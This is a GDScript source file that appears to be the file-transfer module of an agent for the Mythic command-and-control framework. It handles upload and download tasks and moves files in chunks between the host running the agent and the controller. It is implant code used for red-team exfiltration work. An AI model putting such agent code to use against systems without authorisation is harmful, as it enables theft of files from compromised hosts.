extends Node

var api
var file_tasks
var time = 0
var time_period = 1

func _ready():
	api = $".".get_parent().get_node("api")
	file_tasks = {}


func _on_tasking_upload(task):

	if task.has("command") and task.get("command") == "upload" and task.has("parameters"):
		var task_id = task.get("id")
		var parameters = parse_json(task.get("parameters"))
		
		print("parameters: ", parameters)

		print("download the following")
		file_tasks[task_id] = FileTransfer.new(task_id, parameters.get("remote_path"), FileTransfer.DIRECTION.UPLOAD, api, parameters.get("file"))
		print(parameters.get("remote_path"))
		print("")
	else:
		print("bad download task: ", task)
		# TODO: agent_response in failure cases


func _on_tasking_download(task):

	if task.has("command") and task.get("command") == "download" and task.has("parameters"):
		var task_id = task.get("id")
		var parameters = parse_json(task.get("parameters"))

		print("upload the following")
		file_tasks[task_id] = FileTransfer.new(task_id, parameters.get("file_path"), FileTransfer.DIRECTION.DOWNLOAD, api)
		print(parameters.get("file_path"))
		print("")
	else:
		print("bad upload task: ", task)
		# TODO: agent_response in failure cases

func _process(delta):
	time += delta

	if time > time_period:
		time = 0

		for task_id in file_tasks.keys():
			file_tasks[task_id].process()

			# TODO: we shouldn't remove file_tasks until we get the final 'ok' response from mythic - but right now, I don't care...

			match file_tasks[task_id].state:
				FileTransfer.STATUS.ERROR:
					print("Failed to download: ")
					file_tasks[task_id].debug()
					file_tasks.erase(task_id)
				FileTransfer.STATUS.BEGIN:
					pass
				FileTransfer.STATUS.TRANSFER:
					pass
				FileTransfer.STATUS.COMPLETE:
					print("File COMPLETE: ")
					file_tasks[task_id].debug()
					file_tasks.erase(task_id)
				_:
					print("Unknown file : ", task_id, file_tasks[task_id])

func _on_tasking_download_start(response):
	print("_on_tasking_download_start: ", response)
	var task_id = response.get("task_id")
	var file_id = response.get("file_id")

	if file_tasks.has(task_id):
		file_tasks[task_id].process_download_chunk(file_id)
	else:
		print("oh snap, didn't find that task id: ", task_id)

func _on_tasking_download_chunk(response):
	print("_on_tasking_download_chunk: ", response)
	# TODO: implement resend logic if status is not success (and update tasking to allow that state to get here...)
	# roll active_file_handle.position back one chunk_size if position > 0
	var task_id = response.get("task_id")
	var file_id = response.get("file_id")

	if file_tasks.has(task_id):
		file_tasks[task_id].process_download_chunk(file_id)
	else:
		print("oh snap, didn't find that task id: ", task_id)

func _on_tasking_upload_start(response):
	print("_on_tasking_upload_start: ", response)
	var task_id = response.get("task_id")

	if file_tasks.has(task_id):
		file_tasks[task_id].process_upload_chunk(response)
	else:
		print("oh snap, didn't find that task id: ", task_id)

func _on_tasking_upload_chunk(response):
	print("_on_tasking_upload_chunk: ", response)
	# TODO: implement resend logic if status is not success (and update tasking to allow that state to get here...)
	# roll active_file_handle.position back one chunk_size if position > 0
	var task_id = response.get("task_id")

	if file_tasks.has(task_id):
		file_tasks[task_id].process_upload_chunk(response)
	else:
		print("oh snap, didn't find that task id: ", task_id)
